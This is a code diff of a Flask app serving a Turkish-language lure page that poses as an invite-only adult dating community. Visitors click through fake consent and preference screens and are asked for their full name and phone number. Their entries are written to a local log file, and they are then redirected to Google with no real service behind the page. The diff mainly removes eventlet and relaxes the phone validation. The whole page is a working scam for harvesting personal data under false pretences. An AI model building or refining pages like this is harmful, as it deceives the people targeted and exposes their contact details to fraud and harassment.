@@ -1,6 +1,3 @@
-import eventlet
-eventlet.monkey_patch(all=True)
-
 from flask import Flask, render_template_string, send_from_directory
 from flask_socketio import SocketIO, emit
 import datetime
@@ -8,11 +5,11 @@ import os
 import urllib.parse
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'modern_v12_premium_final_ultra'
-# WebSocket bağlantı stabilitesi için eventlet modunu aktif ediyoruz
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+app.config['SECRET_KEY'] = 'modern_v12_premium_final_ultra_fix'
 
-# Görselleri hem senin bilgisayarında hem sunucuda güvenli çeken fonksiyon
+# Eventlet'i tamamen çıkardık, standart modda çalışıyoruz
+socketio = SocketIO(app, cors_allowed_origins="*")
+
 @app.route('/files/<path:filename>')
 def custom_static(filename):
     safe_filename = urllib.parse.unquote(filename)
@@ -27,94 +24,47 @@ USER_PAGE = '''
     <title>Premium Erişim</title>
     <style>
         :root { --primary-color: #ff0033; --bg-dark: #0a0a0a; }
-        
         body { 
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
             background: var(--bg-dark) url('/files/arkaplan.jpg') no-repeat center center fixed; 
             background-size: cover; min-height: 100vh; 
             display: flex; justify-content: center; align-items: center; color: white;
-            overflow-x: hidden; transition: background 0.8s ease;
+            overflow-x: hidden;
         }
-
-        /* Final sayfasında aktif olan canlı GIF arka planı */
-        .gif-bg { 
-            background: #000 url('/files/kadin.gif') no-repeat center center fixed !important; 
-            background-size: cover !important; 
-        }
-
-        .overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: radial-gradient(circle, rgba(0,0,0,0.3) 0%, rgba(10,10,10,0.85) 100%);
-            z-index: 0;
-        }
-
+        .gif-bg { background: #000 url('/files/kadin.gif') no-repeat center center fixed !important; background-size: cover !important; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, rgba(0,0,0,0.3) 0%, rgba(10,10,10,0.85) 100%); z-index: 0; }
         .main-container { position: relative; z-index: 2; width: 90%; max-width: 420px; }
-
-        /* Modern Cam (Glassmorphism) Kart Tasarımı */
         .card { 
-            background: rgba(15, 15, 15, 0.7); 
-            backdrop-filter: blur(20px); 
-            -webkit-backdrop-filter: blur(20px);
-            padding: 40px 30px; border-radius: 28px; 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            display: none; 
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
-            text-align: center;
+            background: rgba(15, 15, 15, 0.7); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            padding: 40px 30px; border-radius: 28px; border: 1px solid rgba(255, 255, 255, 0.1); 
+            display: none; box-shadow: 0 25px 50px rgba(0,0,0,0.6); text-align: center;
         }
         .active { display: block; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-
-        @keyframes slideUp { 
-            from { opacity: 0; transform: translateY(40px); } 
-            to { opacity: 1; transform: translateY(0); } 
-        }
-        
-        h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 12px; color: #fff; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 12px; }
         p { color: rgba(255,255,255,0.8); font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
-
         .selection-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
-        .choice-item { 
-            cursor: pointer; transition: all 0.3s ease; text-align: center;
-            background: rgba(255,255,255,0.06); border-radius: 18px; padding: 12px;
-            border: 1px solid transparent;
-        }
+        .choice-item { cursor: pointer; transition: all 0.3s; text-align: center; background: rgba(255,255,255,0.06); border-radius: 18px; padding: 12px; border: 1px solid transparent; }
         .choice-item img { width: 100%; height: 130px; object-fit: cover; border-radius: 14px; margin-bottom: 10px; }
-        .choice-item p { margin: 0; font-size: 13px; font-weight: 700; color: #fff; }
+        .choice-item p { margin: 0; font-size: 13px; font-weight: 700; }
         .choice-item:hover { background: rgba(255,0,51,0.15); border-color: var(--primary-color); transform: translateY(-8px); }
-
-        input { 
-            width: 100%; padding: 18px; margin-bottom: 18px; 
-            background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.15); 
-            color: #fff; border-radius: 14px; box-sizing: border-box; font-size: 16px;
-            transition: all 0.3s;
-        }
-        input:focus { outline: none; border-color: var(--primary-color); background: rgba(255,255,255,0.2); box-shadow: 0 0 20px rgba(255,0,51,0.3); }
-
-        .btn { 
-            width: 100%; padding: 20px; border: none; border-radius: 14px; 
-            font-weight: 800; cursor: pointer; text-transform: uppercase; 
-            font-size: 14px; letter-spacing: 1.2px; transition: all 0.4s;
-        }
-        .btn-red { background: var(--primary-color); color: white; box-shadow: 0 10px 25px rgba(255,0,51,0.4); }
-        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(255,0,51,0.6); background: #ff1a47; }
-        
+        input { width: 100%; padding: 18px; margin-bottom: 18px; background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.15); color: #fff; border-radius: 14px; box-sizing: border-box; font-size: 16px; }
+        .btn { width: 100%; padding: 20px; border: none; border-radius: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 14px; transition: all 0.4s; }
+        .btn-red { background: var(--primary-color); color: white; }
         .btn-outline { background: transparent; border: 1px solid rgba(255,255,255,0.3); color: white; margin-top: 12px; }
-        .btn-outline:hover { background: rgba(255,255,255,0.1); }
-
-        .char-img { width: 100%; border-radius: 20px; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
-        .step-label { color: var(--primary-color); font-weight: 800; font-size: 13px; text-transform: uppercase; margin-bottom: 8px; display: block; }
+        .char-img { width: 100%; border-radius: 20px; margin-bottom: 25px; }
+        .step-label { color: var(--primary-color); font-weight: 800; font-size: 13px; margin-bottom: 8px; display: block; }
     </style>
 </head>
 <body id="main-body">
     <div class="overlay"></div>
     <div class="main-container">
-
         <div id="step-0" class="card active">
             <h1>PREMIUM GİRİŞ</h1>
             <p>Sadece davetli üyelere özel topluluğumuza katılmak için lütfen şartlarımızı onaylayın.</p>
             <img src="/files/karakter.jpg" class="char-img">
             <button class="btn btn-red" onclick="move(1)">ONAYLIYORUM</button>
         </div>
-
         <div id="step-1" class="card">
             <span class="step-label">Aşama 1 / 3</span>
             <h1>YAKINLIK</h1>
@@ -122,24 +72,20 @@ USER_PAGE = '''
             <button class="btn btn-red" onclick="move(2)">HAYIR, SORUN OLMAZ</button>
             <button class="btn btn-outline" onclick="move(2)">EVET, OLUR</button>
         </div>
-
         <div id="step-2" class="card">
             <span class="step-label">Aşama 2 / 3</span>
             <h1>GİZLİLİK</h1>
-            <p>Buluşmaların tamamen gizli kalacağını ve asla ifşa etmeyeceğinizi taahhüt ediyor musunuz?</p>
+            <p>Buluşmaların tamamen gizli kalacağını taahhüt ediyor musunuz?</p>
             <button class="btn btn-red" onclick="move(3)">EVET, SÖZ VERİYORUM</button>
         </div>
-
         <div id="step-3" class="card">
             <span class="step-label">Aşama 3 / 3</span>
             <h1>CİDDİYET</h1>
             <p>İlişkilerimizde saygı ve güven esastır. Karşınızdaki kişiye karşı dürüst olacak mısınız?</p>
             <button class="btn btn-red" onclick="move('choices')">EVET, EMİNİM</button>
         </div>
-
         <div id="step-choices" class="card">
             <h1>VÜCUT TİPİ</h1>
-            <p>Sizin için en ideal eşleşmeyi bulmamız için tercih yapın.</p>
             <div class="selection-grid">
                 <div class="choice-item" onclick="move('age')"><img src="/files/zayıf.jpg"><p>Zayıf</p></div>
                 <div class="choice-item" onclick="move('age')"><img src="/files/normal.jpg"><p>Normal</p></div>
@@ -147,10 +93,8 @@ USER_PAGE = '''
                 <div class="choice-item" onclick="move('age')"><img src="/files/büyük göğüs.jpg"><p>Fit & Kıvrımlı</p></div>
             </div>
         </div>
-
         <div id="step-age" class="card">
             <h1>YAŞ ARALIĞI</h1>
-            <p>Hangi yaş grubundaki üyelerimizle ilgileniyorsunuz?</p>
             <div class="selection-grid">
                 <div class="choice-item" onclick="move('final')"><img src="/files/18.jpg"><p>18 - 25</p></div>
                 <div class="choice-item" onclick="move('final')"><img src="/files/25.jpg"><p>25 - 40</p></div>
@@ -158,48 +102,33 @@ USER_PAGE = '''
                 <div class="choice-item" onclick="move('final')"><img src="/files/60.jpg"><p>55 - 70</p></div>
             </div>
         </div>
-
         <div id="step-final" class="card">
             <span class="step-label">SON ADIM</span>
             <h1>EĞLENCEYE BAŞLA</h1>
-            <p style="font-weight: 700; color: #fff;">
-                Merhaba bütün cevaplarınız için teşekkürler! Çılgınca fantezilerinizi gerçekleştirmek için son bir adım kaldı. Kayıt olun ve bu çılgın eğlencenin tadına bakın.
-            </p>
+            <p>Bilgilerini doldur ve hemen topluluğumuza katıl.</p>
             <input type="text" id="isim" placeholder="Ad Soyad">
-            <input type="tel" id="numara" placeholder="05XX XXX XX XX" maxlength="11">
-            <button class="btn btn-red" onclick="finish()">KAYDI TAMAMLA & BAŞLAN</button>
+            <input type="tel" id="numara" placeholder="05XX XXX XX XX">
+            <button class="btn btn-red" onclick="finish()">KAYDI TAMAMLA</button>
         </div>
-
     </div>
-
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
         const socket = io();
-        
         function move(step) {
             const body = document.getElementById('main-body');
-            
-            // Son aşamada GIF arka planına geçiş yap
-            if(step === 'final') {
-                body.classList.add('gif-bg');
-            } else {
-                body.classList.remove('gif-bg');
-            }
-
+            if(step === 'final') body.classList.add('gif-bg');
+            else body.classList.remove('gif-bg');
             document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
             document.getElementById('step-' + step).classList.add('active');
         }
-
         function finish() {
             const isim = document.getElementById('isim').value;
             const numara = document.getElementById('numara').value;
-            const checkNum = /^05[0-9]{9}$/;
-            if (!isim || isim.length < 3) { alert("Lütfen geçerli bir isim giriniz."); return; }
-            if (!checkNum.test(numara)) { alert("Lütfen geçerli bir telefon numarası giriniz (05XXXXXXXXX)."); return; }
-            
-            socket.emit('yeni_kayit', { isim, numara });
-            alert("Harika! Profiliniz oluşturuldu. Yönlendiriliyorsunuz...");
-            window.location.href = "https://www.google.com";
+            if (isim && numara.length >= 10) {
+                socket.emit('yeni_kayit', { isim, numara });
+                alert("Başarıyla kaydedildi!");
+                window.location.href = "https://www.google.com";
+            } else { alert("Lütfen bilgileri eksiksiz doldurun."); }
         }
     </script>
 </body>
@@ -211,12 +140,11 @@ def index(): return render_template_string(USER_PAGE)
 
 @socketio.on('yeni_kayit')
 def handle_kayit(data):
-    zaman = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    zaman = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
     with open("kayitlar.txt", "a", encoding="utf-8") as f:
-        f.write(f"Zaman: {zaman} | İsim: {data['isim']} | Tel: {data['numara']}\\n")
+        f.write(f"{zaman} | {data['isim']} | {data['numara']}\\n")
 
 if __name__ == '__main__':
-    # Render'ın dinamik port atamasını karşılayan kritik kısım
     import os
-    port = int(os.environ.get('PORT', 80))
+    port = int(os.environ.get('PORT', 8080))
     socketio.run(app, host='0.0.0.0', port=port)
